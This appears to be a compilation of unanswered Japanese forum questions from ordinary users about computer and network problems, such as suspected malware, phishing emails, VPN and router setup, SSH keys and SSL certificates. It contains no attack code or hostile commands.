実際に取得してみました。偽名のものを発行してくれました。
私の夫が使っているガラケーから送られてきたSMSメールなんですが、夫に返事を返したところ、一向に話の内容のつじつまが合わず、家に帰って夫が送ったSMSメールの内容が夫の打ったものと違う内容に換えられて、私のところへ送られて着てたようで、当然話がかみ合わず、険悪な事になったのですが、それ以外にも、毎日、夫が私に定期的に送ってた内容の文が、ある日の分とそのまたある日の分が消されてたり、同じ日にその定期的に定時に送ってた内容が数時間後に前日の内容だったりして、何だか奇妙な現象が起こるようになりました。これって、よく言う通信傍受とか改ざんであったりというような、卑劣な犯罪なんでしょうか。このような事を防ぐにはどういった事に気を付ければ宜しいんでしょうか。プロバイダーや携帯会社に通報連絡した方が良いのでしょうか。振込詐欺のようなことが起こらないか心配です。モバイルオンチな上、周囲に詳しい人もおらず、相談出来ない状況ですので、どなたか詳しい方がおられましたら、ご意見、アドバイスを宜しくお願いします。
最近よく以下のメールが送られてきます。無視していますが、同じようなメールを受け取られている方はおられますか？ ちなみにノートンセキュリテイを導入していますが、Antispamメールで、かつAutoinfo@として送られてきます。 メール内容：お客様のアカウントは何らかの取引に利用されている恐れがありますので、お手数ですが、システムにログインして、異常がないかご確認いただきますようお願いします。 （この後ログイン先のURLが続きます。） :
Windowsの機能でデバイス制御すると スマホ等のUSBマスストレージまでは制御できるのですが、 「MTP（Media Transfer Protocol）」の制御はできないそうです。 内部からの個人情報漏えいを防ぐ対策の一環として、 デバイス制御するための市販ツールでお勧めのがあれば教えてください。 クライアントPCはWindows7Proが20台程度です。 多機能を備えていてもいなくても構いませんが、 コストパフォーマンスに優れているものを望みます。
光通信のマルチモード光ファイバーは、 コア内の経路が異なる光が複数通るファイバーと説明されてますが、 これは例えば用途に応じてモードを使い分けれるということでしょうか？ 例えば動画用の信号はモードAの光に、音声用の信号はモードBに、 監視用の信号はモードCに といった感じで一本のファイバー内を複数の信号が共有できるようにしてる といったイメージでしょうか？
下記の３つのLinuxPCを使って、TCP/IPによるソケット通信のシステムを作成しました。 PC1: IP:192.168.0.1 Port: 20000 TCPサーバ PC2: IP:192.168.0.2 Port: 20000 TCPサーバ PC3: IP:192.168.0.3 Port:ランダム(クライアントなので) TCPクライアント PC3をクライアントとして、同じポート番号を持つアプリが動いている PC1とPC2に繋いで通信をする形です。 このシステムは問題なく動きました。 しかし、続いてPC1とPC2を一つのPCに(ハードウェアとして)まとめたくなったときに、 下記の条件があったとき、どのようにすれば良いでしょうか？ 1. PC3のソフトウェアは一行も変更しない 2.りPC1とPC2が同一のハードウェアになっても、それぞれのソケットに流れるデータは変わらない 一台のコンピュータにおいて、一つのNICに複数のIPをふることはできましたが、 同じポート番号のソケットを作成するのはできないと思っています。 今のところ、一台のコンピュータで仮想マシンを二台立ち上げる方法を考えていますが、 それ以外に上手い方法はあるでしょうか？ 非常に困っているため、ご回答よろしくお願いします。
表題の通りですが、WinXPのノートを自宅のネットワーク(常時インターネット接続)に接続されている、「安全に」NASに常時接続して使う方法はないでしょうか？ 小さなファイル(数KB以下)の読み書きさえできれば問題ありませんが、NASの設置場所が別世帯にあり、USB接続ができません。 そこで考えてみたのですが WinXpマシン -------RS232C-------Win7マシンーーーL2スイッチーーーNAS このような構成にして、XPマシンとWin7マシンにはUSBシリアルインターフェースを追加し、XPのイーサネットインターフェースは物理的に外す。それぞれターミナルソフトを起動して、TCP/IPは使わず、xmodemで転送。ターミナルソフトやxmodemの起動、NASとのやりとりは自動化することとします。(NASにウイルスはないものとします) これは問題ないでしょうか。
悪意のあるソフトウェアの削除ツール１１月版をインストールしてから、マウスポインタの動きが途切れたり、デバイスの抜き差しをする音が勝手に鳴ったりする不具合が起こるようになりました。 インテルCPUのWin7とXPだけなり、アスロンCPUのWin7は起こらないみたいです。 コンパネの「プログラムの追加と削除」の更新プログラムを表示させても出てこないので、どうやって、悪意のあるソフトウェアの削除ツールをアンインストールすればよいのでしょうか？Win7とXPの両方のやり方を知りたいです。 復元よりも先にアンインストールから試みたいと考えています。よろしくお願い致します。
情報漏えい対策ソフトでお勧めのものはありますか？ ネットで機能だけ見るとどれも良い事を書いてありますが、 実際使ってみると不安定だったり使いづらかったりすると思います。 実際使われてる方の満足度の高いものをお薦めいただけると助かります。 要件としては ・デバイス制御(USB、CD/DVD、スマホ等) ・ファイルの持ち出しを監視、禁止できる ・クライアントにインストールしておき、後はサーバ側で一括管理できるもの ・クライアント側の負荷が低く安定、通常業務時に極力支障をきたさないもの ・クライアント20台(Windows7,8)を管理できてなるべく低コスト 端末ごとにローカルセキュリティポリシーの設定等によりある程度制御できますが、 なるべく手間をかけず変更漏れなどないように、一括管理できるツールが知りたいです。 ついでにWindowsUpdateの管理とかできるとベターなのですが・・・ 経験者、詳しい方いらっしゃいましたら、よろしくお願いいたします。
YAMAHAのRTX1200のルータを利用してフレッツ光でインターネットを利用しています。 固定IPアドレスです。 最近ニュースなどで企業への攻撃などがあるなど報道されていますが、 サイバー攻撃されているかどうか調べる方法はどのようにすればいいのでしょうか？ 今所有している機器で調べるできますか？ よろしくお願いします
Windows7 のローカルグループポリシーエディターで リムーバブルディスクの書き込みアクセスを拒否する設定にしたので、 現在、USBメモリにデータを保存できないようになっています。 この状態で、 Android端末、iOS端末をUSBケーブルで接続した場合も、 PCから端末にデータを保存する事はできなくなっているのでしょうか？ 通常だと、Android端末をPCと接続するとリムーバブルドライブとして認識するので、 microSDカードへの読み書きができますが、それを防げるのか？ iOS端末をPCと接続するとカメラロールへの読み込みのみしかできないですが、 iTunesなどにより、PC内のデータを端末に保存するのも防げるようになっているのか？ ご存知の方がいたらご教授願えると幸いです。
Windows8.1のデスクトップに、最近新しいアイコンができています。 「楽しもう！PCライフ　MDLC」　と　「楽しもう！officeライフ」となっています。 これはどのようなものでしょうか。　自分で呼び込んだ覚えはありません。
事の発端は自分はパソコンに疎く、パソコンを購入する際に迷っていた際、知り合いが自分が作った物を安く売ってあげる、この方が絶対にお得、と熱弁され、愚かにも口車に乗ってしまった事が発端です。その後使っていると明らかにいろんなサイトに自分以外の誰かがログインしている節がありました。そこでウイルスバスターを使いチェックするとウイルスが検出されました。買ったときにワクチンは入れており買って一ヶ月で感染が確認され自分では怪しい行動はしていないのでウイルスバスターを入れた後のパソコンに手動で入れられたのかもしれません（購入時その知人は自分が組み立ててあげるということで一緒にいます）。最初は知人を疑ってはなかったのでウイルスにかかったことを相談していたのですがうまくいえませんが言動や態度などがどうにも違和感を感じ、これはこの人の仕業では？と思ったときからいろいろ辻褄があうように思えた次第です。他にも違和感として何もしていないのに勝手にパソコンが起動する、今自分がパソコンでしていることを知られている節がある、履歴に身に覚えのない履歴があるなどです（一人暮らしなので家族も使っているとかではありません）。ですが結局物理的な証拠があるわけではないので何も言えず、１５万近くも出して買ったパソコンなのでウイルスが見つかったからとすぐに買い替えを検討もできず、とりあえずウイルスを削除したら大丈夫かと思っていたのですが、メールアドレスやパスワードを何度変更しても一向に不正なログインが続いています。もう精神的にも疲れてしまったのでご質問させていただきました。質問したいのはこのパソコンはいくらもったいなくてももう処分するべきなのか、処分するにせよしないにせよ今被害を防ぐためにしたことがいいことはあるか、警察などにやはり相談したほうがいいのか。ということです。そしてこれはパソコンを買い換えたらもう大丈夫なんでしょうか？パソコンは高価なので買い換えたとしても結局何らかの方法で情報を盗めてしまうならただの無駄遣いになってしまうので・・パソコンに関しては私は本当に疎く、自分の無知さが招いた結果だとも思うのですがもう疲れてしまいました・・どうかご助力をお願いします・・
突如PCが不調になりました。 ネットを観覧していると、写真の様なメッセージが出て、OKを押してダウンロードするを押しますが、「このウェブサイトは、安全でない可能性があります」と出ます。 どうしたら良いのか解りません。 PCにはあまり詳しくありません。 よろしくお願いします。
Facebookの申請拒否した場合相手に拒否した事バレますか？ 『友達リクエスト』に戻るのでしょうか…
質問させていただきます。 HTTPで通信するソフト(クライアント側)を作りたいのですが、私は組込み系のソフトしか作ったことがなく、ネットワーク系は初めてだったので、プロトコルの勉強から始めました。TCP/IPは理解し、HTTPの仕様がRFCというもので文書化されているのは分かったのですが、RFCには数が多く、HTTPの仕様も膨大にあるように感じました。 HTTPで通信するソフトを作る人はどうやって仕様を把握し、ソフトを作っているのでしょうか？私は何が必要で、何が必要でないのか判断が付かない状況です。 特にヘッダーフィールドは数が多く、理解が大変で困っています。 (世の中のHTTPクライアントはHTTPの全ての仕様を守っているのでしょうか？) よろしくお願い致します。
社内LANに接続されているPCの中で、調査のために1台のPCのパケットを取りました。 解析している中で、おかしなことがあるのに気がつきました。 空きいているはずのIPアドレスからパケットが到達しているのです。 IPアドレス(仮に192.168.0.100) から、このPCに対してのパケットがいくつか 記録されているのですが、192.168.0.100はIPアドレス管理台帳上では「空き」 となっており、当然ping 192.168.0.100も応答はありません。 念のためとおもい、http、telnet、sshとかでもこのIPアドレスに接続してみましたが 応答はなく、arpで調べても(192.168.0.100にpingしてからarp -a)出てきません。 このIPアドレスは過去にはPCの1台に割り当てていたIPアドレスで、そのPCは 今は支店に移動したので、第3オクテット以降は別のものになっています。 という状況なのですが、パケット上では192.168.0.100からのパケットが定期的に 到着しているので、何らかの機器がそのIPを持って稼働しているものと思います が、調べる方法はありませんでしょうか? よろしくお願い致します
ＩＰアドレスは、一つのパソコンに置いて２つあるという認識であってますか？ パソコン側と、ルータ・モデム側のそれぞれ１個ずつありますか？
ｓｓｈで接続する際に公開認証鍵を使用する場合の認証鍵はホストとクライアントのどちらで作成するべきでしょうか？ ネットでいろいろ参照すると、ホストで作成する場合とクライアントで作成する場合の両方が紹介されています。 teratermなどのクライアントで複数のLinuxのホストに接続する場合、 クライアントで作成して、同じ公開鍵を各Linuxのホストに配布したほうが、シンプルだと考えます。 ホストで鍵を作成したほうが、セキュリティ上、好ましい理由などがあれば、教えて頂きたく、質問させて頂きました。
脆弱性の詳細についてMicrosoftや報道機関の発表 より詳しく解説されたサイトなどありますでしょうか？ 例：2014.1 IEゼロデイなど 日本国内の情報では概略のみで、実際の脆弱性を引き起こす コード例や各プロセスレベルでの解説がされているサイトを 探しています。(英語ページでも可です) セキュリティー全般を勉強しており知識の参考にしたいと思います。 よろしくお願い申し上げます。
１年位前から自分のメールアドレスからの迷惑メールが届くようになった。迷惑メールとして受け取らないようにしているのですが、気になります。 他の人に私のアドレスからの迷惑メールが送られているのでしょうか？ どのようにしたら、乗っ取られたメールアドレスを消すことができますか？
最近、サイトを開くと広告が現れるのですがそれらをブロックするアプリとかないですか？
Yahoo 知恵袋の知恵ノートに会社の体質を書いたら消されるんだよね。 ブラック企業かもしれないって書いただけでわずか数十分で消された。 恐ろしい企業だと思いますが皆さんはどう思いますか？
かつてFacebookに顔写真を載せていました。 何気もなく、自分の名前をGoogle検索したところ自分の顔写真が掲載されていました。(当たり前ですが…) さすがに嫌だったので、Facebook上で顔写真は削除したのですが、Google上では削除した顔写真は残っていてGoogle上でも顔写真を削除したいのですが、どうすれば良いでしょうか？ アドバイスよろしくお願いいたします。 分かりやすい手順を教えて下さると助かります。
ファイヤーフォックスのスタートページの検索にて 文字を入力すると予測が下に表示され その予測をマウスポインターでクリックすると検索されますが ある時からいきなり予測をクリックすると空白に戻ってしまうようになりました^^; それも全てではないみたいで クリック出来るのとできないのがあるみたいです。又カーソルではクリック可能です。 どなたか直し方や原因がわかる方宜しくお願いします。
少し前から、bashの脆弱性の問題が指摘されていると思うのですが、例えばJPCERTは その対策の一つとして 「GNU bash を代替のシェルに入れ替える」 というものを上げています。 代替のシェルに入れ替える場合の具体的な方法ですが、例えば、(/etc/passwd等の)ログイン情報を見て、bashがログインシェルに設定されているユーザを、zsh等に書き換えて、再起動してしまう、というやり方で、十分なのでしょうか。 今現在問題に直面しているわけではないのですが、「入れ替え」の方法について、教えていただければと思います。
登録時のメールアドレスを偽ったメールアドレスで登録し、偽名を使って複数のアカウントを作ることは犯罪になりますか？ 馬鹿げた質問ですみませんが 回答お願いします。
フリーのソフトウエアでメディアサーバーを構築して WEBカメラの映像を自作サイトでライブ配信したいと考えています。 WEB。クライアント、デスクトップ、プログラミングはそこそこ出来るものの、この手の映像関連の知識が全くありません。WEBカメラや、メディアサーバーソフトウエア関連の知識です。 手軽に行うには、ハードウエアソフトウエアのどのような構成がおすすめでしょうか？ ちなみに、同時接続クライアント数は最大100件程度で検討しています。
タイトルの件なのですが 以下の様なNWでコマンドを用いて設定の練習を行いたいです。 PCA⇔S1⇔R1⇔R2⇔S2⇔PC2 PC２台とcisco社のルーター２台は用意出来ました。 そこで質問なのですがこのような場合スイッチもcisco製の必要ございますでしょうか？ IPアドレスが与えられることとコンソールインタフェースがあればコマンドの練習をするのにはsisco製じゃなくても良いのか？と検討がつきません。 何卒よろしくお願いいたします。
次の二つはデータの暗号化について説明していますが 私の理解で合っているか教えていただけますか。 １送受信されるファイルは、「ユーザーとサーバーの間で暗号化」されており 　「サーバー上でも同様である」 ２ユーザーのコンピュータ上でもデータを暗号化している 私とサーバーの間で暗号化されるというのは 私が入力したデータはサーバーに到着すると同時に暗号化されるということ。 一方で、コンピューター上で暗号化されるというのは、 私のコンピューターにそういう機能がついていて、暗号化されたデータをサーバーに 送信しているとういこと。 １と２は下記のリンクから抜粋しました。 http://jp.techcrunch.com/2014/10/13/20141011edwa … 現在は、１の方が主流でしょうか。 その場合、２の方が安全だと思いますが、２が主流にならない理由は何でしょうか。 ありがとうございます。
現在フレッツ光VPNワイドで３拠点間ネットワークを組んでいます。 現在使用しているルータはYAMAHART57Iを３拠点とも使用しております。 構成は　本部を主要拠点1とし残りの拠点2と拠点3の支店はそれぞれ拠点1のみとの通信をしており拠点2と3間の通信はおこなっておりません。　 今度、５拠点間のネットワークを組む事になり、予備のRT57Iを利用しようとマニュアルを見ていましたらRT57Iでは4拠点までしかネットワークを組めない事をしりました。 そこで　本部拠点1用に中古でも良いので５拠点間を結べるルータを探しているのですがRTX1200では高価すぎると思っていたところ　RTX3000という旧型機をみつけました。 前任の担当者が辞めており、私はネットワークは素人でコンフィグを少しいじれる程度の知識しかありません。 そこで質問なのですが　RTX3000を購入して　現在使用しているRT57Iのコンフィグを利用するなどしてRTX3000のコンフィグ設定などを行い運用する事ができるでしょうか？ 光フレッツグループから光ネクストワイドVPNに移行した際にコンフィグを書き換えて運用できるようにした程度の知識しかありません。 又、RTX3000以外でこの環境で使用できる　安価、もしくは中古で購入できるおすすめルータがあれば教えていただきたいのですが・・ よろしくお願いいたします。
先ほど妹がフリーゲームをダウンロードしたら木馬型ウィルスに感染してしまったと相談したのですが、教えて戴いたサイトでスキャンしたところ検出率？が０でした。 ですが調べ物などでブラウザを開いたりすると広告のようなものがでるようになり内容は「お使いのPCがクラッシュ寸前です」などといった内容です。やはりウィルスかなにかに感染してしまったのでしょうか？PC初心者な上に、必要最低限でしか使うこともない機械音痴なので調べても英語だったり難しかったりし、おかしなサイトに飛んでしまうんじゃないかと思うと怖いです。ルータも切ったほうがいいのでしょうか？　 使ってるPCはdynabookです。自分の不注意でこんなことを招いて申し訳ないのですがどなたか分かりやすく解決策を教えて戴きたいです。お願い致します。
はじめまして、学生の者です。 以前PCを購入したのですが機械音痴なので下手にいじりたくはないとおもい、勉強などやニュースなどの調べ物以外では使ってなかったのですが、妹が「友達がやっていたPCのゲームがしたい」と言われ、使う用事がなかったのでPCを貸しました。 ゲームをダウンロードするにあたってダウンロードのソフト？のようなものをとって読み込みでスキャンをしてた途中に「木馬型ウィルスが発見されました」という表示がでたと言われ見ると処理してくださいとの表示があり、その通り進めたのですがそのたびに木馬型ウィルスが発見されました処理してくださいとの表示がでるようになりました。 色々検索して調べたのですが、言葉などが難しくPC初心者でばかな私には難しく理解ができないので、どういったものでとても危険なものなのか？とか分かりやすく説明していただけませんか・・？ よろしくお願いいたします。
まずはシンプルに質問してみたいと思っています。 ひとつのIPをもったサーバーに、異なるドメインでSSLを設置することってできるんでしょうか。 SNIの解説では異なるバーチャルドメインの設置はよくあるのですが、 example.com example.jp のような設置は可能なんでしょうか。 制限があればそれも知りたいのですが、まずは可能かどうかを知りたいです。
本部にUNIVERGE IX2215 A～F支店の６ヵ所にはUNIVERGE IX2105 を設置して、VPNを構築しようと思っています。 器材も揃え、本日業者が取付けに来たのですが、業者の説明を聞いて困ってしまっています。 IPアドレス設定は以下の通りで 本部のIPアドレスは 192.168.0.*** A支店は 192.168.1.*** B支店は 192.168.2.*** 　　　： 　　　： F支店は 192.168.6.*** 問題は、各支店のPCから本部のPCへのアクセスは可能だが、各支店のPCから別の支店のPCへのアクセスは不可となるというのです。 こちらの希望としましては、全事業所 192.168.0.*** で、本当に１つのLANにしてほしいのですが業者は無理だと言います。 この機種では、それは本当に出来ないのでしょうか？
amazonaws.comと自分のPCとの不振な通信があったため、少し検索してみるとかなり悪質なサーバーのようでした。 そこでhostsやファイアーウォールでブロックしようとしたのですができませんでした。 このサーバーとの通信を全てブロックするにはどのようにすればいいでしょうか？
パソコンに詳しい方にご質問なのですが、自分の名前を検索したところ 同業者の人のブログが出てきたのですが、全く名前も違うのに 不思議です。どうしてこのような同業者の人のブログがでてくるのでしょうか？
WinXPノートPCです。無線子機（ELECOM＝LAN-WH300NU2)で使用していました。 PCをリカバリーしたところ、ドライバーはインストールでき、 アイコンはタスク右下に表示されます。が、接続しません。 接続は限られているか、利用不可能です。インターネットや、ネットワークリソースにアクセスできない可能性があります。詳細情報については…クリックすると j状態→限定または接続なし ネットワカーク名（SSID)→elecom2g-13AE60 と表示されます。接続には設定が間違っているのでしょうね？子機の故障でしょうか？。 RAN接続はできます。（OCN光フレッツ） よろしくお願いします。
L2スイッチでタグVLANを作成する場合、 VLAM10 VLAN20は別セグメントという扱いになると思いますが VLAN10→VLAN２０へ通信する場合、上位スイッチを経由するかと思いますが 上位機器（L3スイッチやルーターなど）で、特別設定をしなくても、問題なく通信できるのでしょうか。 CISCO製品のタグVLAN等で行う場合、上位機器でポートとタグVLANの紐付け設定が必要かと思いますが、上位機器で設定不要な方法もあるという話を聞きました。 いまいちイメージがつかないのですが、もし知っている方いらっしゃいましたら どのような経路で通信が解決されるか教えてもらえると助かります。
Ciscoのルータを使用してVPN接続をしています。（BGPとIPSEC） この環境で、ルータをL3SWに置き換えて、VPN接続が可能な機種ってあるんでしょうか？ L3SWにルータ機能をもったものですね。 最近の高機能製品ってどういうのがあるのか把握できてないので。 よろしくお願いします。
自分が利用する複数のサイトに現れてしつこく付きまとうネットストーカーがいます。 どうも自分がどのサイトに現在いるのかを把握されているらしくネット上でストーキングされています。 どうしてそういったことが可能なのかがわからないため質問しました。 １．どこかのサイトで待ち伏せて自分のIPアドレスを取得し、それを使って行動を追跡している ２．同じように何らかの方法でIPアドレスを取得し、それを元にハッキングして侵入している ３．トロイなどのウイルスやスパイウェアに感染し、端末から情報を送信させている 現在利用しているアンチウイルスソフトは比較的検知精度が高いですが、まったく検知されませんでした。
友達がフェイスブックで嫌がらせを受けていて、精神的に参っています。 以前ストーカー被害もあったのですが相手に心当たりもありません。 このフェイスブックの男、なぜかプロフィール検索しても出てこず、気味が悪いです。 この男を特定する方法はありませんか？ どのカテゴリーかわからずコンピューターにしました。カテゴリ違いでしたらすみません。
たまに電話帳を抜き取るソフトで電話帳を抜き取られたという人がいますが、それと同じように写真BOXを抜き取るソフトがあったりして抜き取ることはできますか？ またIPアドレスというので一般の人ではどこの誰かは特定できないと聞きましたが探偵ならできますか？ 回答よろしくお願いします。(._.)
私はFacebookを利用していますが、お知らせに○○はFacebookを利用していますときています。これは誰かが私のページを見てるってことなのでしょうか？
そのままなのですが、他人のデバイスのMacアドレスを取得する方法にはどんな方法がありますか? 自分と違うLANに接続しているデバイスのMacアドレスを取得したいのですが。urlを踏ませたりすることで取得することは可能ですか?
メールを送ると下記のような文章がかえってきます。受信拒否ですか？ Message from yahoo.co.jp. Unable to deliver message to the following address(es). <相手のアドレス>: Resources temporarily unavailable, please try again later [#4.1.12]. /I'm not going to try again; this message has been in the queue too long. --- Original message follows. Return-Path: <自分のアドレス> The original message is over 5k. Message truncated to 1K. Return-Path: <自分のアドレス> X-RocketTIP: 202.248.44.33: NO_TIP_HEADER_ALLOWED X-RocketSRV: s_ip=202.248.44.33;d_t=1412068924;Retro=Y; X-RocketRDL: passed (202.248.44.33; optin=true; cat=good; res=ham; lookup=conuserg007.nifty.com) X-Rocket-Track: cat=UK; info=rule:GD<id=160>;ip:ER<ip=202.248.44.33>;osg:UK;url2db:NN<url=nifty.com>;sgor:UK;abaca:UK<313, fh=mta559; fi=100.64.97.5:14050; rg=J; GT=0; fs=313; ns=50; ws=313:A:165:58:30:0:0:0:-25:0:N:-25; nn=0:0:30:10; cn=1:0:0:0:1:115:0:1:0:0; ex=W:D:0000:GKTXY; sk=FEnO1u7dJh8; st=AAS; id=J645npD0-8U182242W; rv=master.69.4-g9cede4e/100.64.97.5:14051; ts=LYBrX; gv=314; fp=RiARA; os=B; fu=P/////////n; gd=1; fl=EAAEAA; ip=202.248.44.33; ht=1; hv=1; td=1; ha=GglAW/XDtYN; ho=O8RmYgsfRdx; hd=GglAW/XDtYN; hf=HKa3fYoefm9; hF=0rDU9M7ViR; hr=IgQ0AZwLyeW; ZF=MWVBLUtDzMq; Zf=PVZro1SaPQT; Zi=PsAs6+mQGnW;, SRV_OR=1,WS_OR=1,WSS_OR=1,OR=1,AB_WS_IP=0> X-YMailISG: Ig7oPlIWLDvd4GZgP48VuNURVVFsdNOIRxAQ5rljUrhki2Gm BHLNz3LMp.mQMEmPQh7mfyz7iMQLII1JAcCaPaA4YJUd66KeDgW5iJsmca9. xVBfNGAyAUnBn4YA667ub962RuwACNCsUZAQHBtduGlv2_BHpOEZzeOwJNDz e7tlyUMcW9aT7uX_5.Ym.HFUNTXCe7HNE_0Ks.iBVtp5bai_tu0roGbML.Lo kh *** MESSAGE TRUNCATED ***
現在HPでメールフォームのCGIを使っているのですが、そのほとんどが迷惑メールに振り分けられてしまいます。 受信メーラーはGmailを使っています。 根本的にどういった理由で？というか原因で迷惑メールと判断されてしまうのでしょうか？ 当然ですが、スパム的な事や大量送信などを行っているわけでは無く、普通のお問い合わせの確認用返信メールがスパムと判定されてしまいます。 こういった事情にお詳しいかたいらっしゃいましたら、アドバイスを頂けないでしょうか。 とても困っております…。 よろしくお願いいたします。
パソコンをシャットダウン後に、外部から遠隔起動されたくないので、パソコンをシャットダウン後にLANを自動的に切断（物理的に切断）する様な製品があれば教えて貰えないでしょうか？
画像に文字データを埋め込んでしまう方法で、見かけは普通の画像にしか見えないものをつくる。 そんな文字データを含んでいる画像を添付したメールは、 （メールの本文は、画像を良く見てね　と書いてある。） 暗号メールだと思うのですが、 このメールを盗聴した人が、 これが、なんでもない普通の画像が添付されたメールなのか、 それとも、暗号化されている文字データを含む画像が添付されたメールなのかを 判断するにはどんな方法がありますか？ 時間がありましたら、よろしくお願いします。
ADSLで家庭内無線LANで2台のPCを接続していました。 wimax2に変えたところ1台（windowsxp sp2） で接続ができなくなってしまいました。無線の電波は受信し、有効になっていますが、 接続をクリックしてwpaキーを入力してもつながりません。 もう一台（windows7）ではつながります。 原因をどのように特定すればよいのかがわかりません。どなたかアドバイスをいただけると助かります。
MACでIPアドレスの調べ方について質問です。 「システム環境設定」→「ネットワーク」のIPアドレスの四桁の数字が正しいIPアドレスだと思っていたのですが、最近、ロリポップのhcaccessの設定をしていたところ、ロリポップの解説ページで表示されるお客様の『接続元IPアドレス』という欄に自分のIPアドレスが自動表示されるのですが、全く違う四桁の数字が表示されていました。 以下そのページです。 http://lolipop.jp/manual/blog/wordpress-htaccess/ 実際、ロリポップで表示されるIPアドレスでアクセス制限をしたら、うまくいきました。 マックの「システム環境設定」で表示されるIPアドレスとなぜ違うのでしょうか？
家族のPCがADサイトによって、ウイルス感染したのですが、 無線LANの止め方を確認させてください。 画面に変なダイアログがでて消えないそうです。 相手はプロですよね？リカバリ必須ですよね？ そのPCはブートセクタウイルスでなければリカバリすれば100％処分完了と思ってよいでしょうか？ 最大の問題はバックアップですが...。 記録媒体が接続された瞬間にそちらに感染するないしはバックアップしたファイルに感染している可能性も有りますよね。 バックアップは再感染覚悟で行うしかないでしょうか？ お気に入りなど、クラウドに保存してリカバリ後ダウンロードでも感染するでしょうか？ リアルタイムスキャンでも見つけられなかったのでしょうか？ ちなみにESETです。 リカバリの前にスキャンしてウイルス名を知っておいたほうが良いですよね。 他に感染してるときに名前が分からないと何をやっていたかわからないので。 本当はESETに拡張子代えて送りたいですが、そのリスクのほうが大きいでしょうね。 本題です。 画面右下の無線LANアクセスポイントの接続と書いてあるアイコンを右クリックして、 切断したら完全に遮断できたと考えてよろしいでしょうか？ ping打って返信が無ければ確実でしょうか？ 心配なら無線LANルータも電源停止したほうが良いでしょうか？ 他のPCはウイルススキャンをして、ネットワーク感染の有無を確かめるしかなさそうですね。 最後にルータやONUは初期化しなくても良いのですね。
SSHでの通信経路暗号化についてご質問があります。 SSH2 でaes256-cbc aes128-cbc blowfish-cbcのどれかで 通信路の暗号化を検討してます。 ぐぐって調べてみたのですが、blowfish-cbcがaes128-cbc より強度が上と言うページもありますが、どっちの強度が上 なのでしょうか。 #どっちもどっちでしょうか？ また、企業ユースで用いるアルゴリズム、個人で用いるアル ゴリズと両極端で結構ですので教えていただけると助かりま す。 #レポート作成でのたうち回ってますw 自分的にはaes256-cbcの方が強力とみてますが、うまく整理 できておらず、識者の方のアドバイスをいただければと思いま す。 よろしくお願い致します。
adriveに無料プランで登録、使用しておりました。 先日久しぶりにログインしようとしたとろこ、パスワード等間違っていないのですが 「This account is currently in maintenance mode. We sincerely apologize for this inconvenience. Your account should be returned to normal within the next 24 hours.」 と表示されてしまいログインできませんでした。 こういった症状を体験した方や、解決への糸口をご存知の方が いらっしゃいましたらぜひご享受ください。 どうぞよろしくお願いいたします。
いつも参考にさせていただいてます。 今SSHで使えるRSA1、RSA、DSA鍵の違いについて調べております。 RSA1はSSH1で使える鍵で RSA、DSAはSSH2で使える鍵と理解しておりますが RSA1・RSA・DSAでの違いって何なんでしょうか。 #RSA1・RSAで違いはないと思いますが、念のため・・・ また、上記三種の鍵のメリット・デメリットを教えていただければ大変 助かります。 よろしくお願いします。
こんばんわ Windows8タブレットpcを使って居ますが.パスワード忘れたので起動しません。 リセット方法又は初期化方法教えてください
普段IEを使っており、yahooのトップから検索をしているのですが、 アドレスバーにワードを入れて検索すると、「DAM」と書かれた身に覚えのない 検索エンジンで検索されます。 （http://www.findamo.comです） 以前はこんなことがなかったのですが、何らかのウィルスに感染しているのでしょうか？ OSはwin7、ブラウザはIE11です。 セキュリティは「ESET」を使用しています。 削除方法をお教えいただけないでしょうか。
ウィルスセキュリティZEROを使用しています。 最近急に、リモートIPアドレス：192.168.1.23からローカルTCPポート：49152～49156へのアクセスが検出されるようになりました。頻度もかなり多く、ずっとウィルスセキュリティの警告がPCに表示されっぱなしになっているような状況です。 ルータにてIPアドレス192.168.1.23のMACアドレスを調べてみると、これは最近購入したAndroid端末（YOGA Tablet 10）のものでした。 また、49152あたりのポートを利用するアプリケーションもインターネットで調べてみると、AppleのXsan Filesystem Accessというアプリが使用しているようですが、心当たりがありません。 android端末にインストールしたアプリかなにかの影響でしょうか？ ずっと警告が表示されていて鬱陶しいので、無害なものであれば通過許可もしくは警告を非表示にシたいのですが、もしこのアクセスの正体が分かる方いらっしゃいましたら、ご教授願います。
外部に公開しているWEBサーバーの話です。 業者からセキュリティーソフトの運用を勧められています。 弊社のサーバーはルーター側で８０番ポートしか開放していないのですが、サーバー用のセキュリティーソフトなど必要でしょうか？ 私は内部からの不正行為やスクリプトの問題がない限り、外部からデータ改ざんやウイルス混入など不可能と考えています。 サーバー用のセキュリティーソフトを利用するメリットはあるのでしょうか？
Windows2008R2環境のAcrive Direcoryで 社内のPCを管理しています。 管理対象のPCのOSは全てWindows7となります。 数としては50台程度です。 各社員に与えたユーザアカウントはUsers権限しか与えてません。 必要以上に権限を持たせたくないことが理由です。 　※勝手に変なソフトをインストールしたりなど 通常の業務は問題ないのですが、 JavaやAcrobatのアップデートが 管理者のIDとPWDを問われ、各自が対応することができません。 JavaやAcrobatがセキュリティホールとして外部から狙われてしまい、 ウィルスに感染したPCが情報を漏洩することを恐れています。 ※考えすぎかもしれませんが・・ こういったケースでアップデートを実施したい場合は、 どういった解決策が考えられますでしょうか？。 考えている案： ＜人の運用でカバー＞ ・管理者のIDを都度払い出し、社内の各業務チーム内でアップデートを人で実施 ＜設定の一部変更＞ ・各ユーザを「Power Users」とし各自でアップデートするが、 　　他ソフトウェアのインストールは「ルールとして禁止」にする 他に妙案がありましたら、 アドバイスを頂けると助かります。
サーバ証明書のコモンネーム(Common Name、一般名)について教えてください。 公的認証局のホームページを見ると、サーバ証明書のコモンネームはSSL接続するサイトのURL（FQDNまたはIPアドレス）とする、と記載されています。しかし当方の知り得る範囲で（イントラネット内ですが）、証明書のコモンネームとURLが異なるものがあります。（*を使っていて一部しかあっていない、などということではなく、まったく異なるドメイン名となっている） このことに関して以下について教えていただけませんでしょうか。 (1) 証明書のコモンネームとURLを一致させるというのは、サーバ証明書の仕組みとして必須なのでしょうか？それとも、努力目標やマナーといった「必ずしも一致させなくても良い」というレベルの取り決めなのでしょうか？ (2) 当方にて、前述したコモンネームとURLが異なるサイトを表示させた場合、証明書エラーが出たり、URL欄が赤色で協調されたりということはありませんでした（当方はInternet Explorer8を使用）。コモンネームとURLが違う場合、Webブラウザはユーザには何ら警告を出さないものなのでしょうか？ 以上、よろしくお願いいたします。
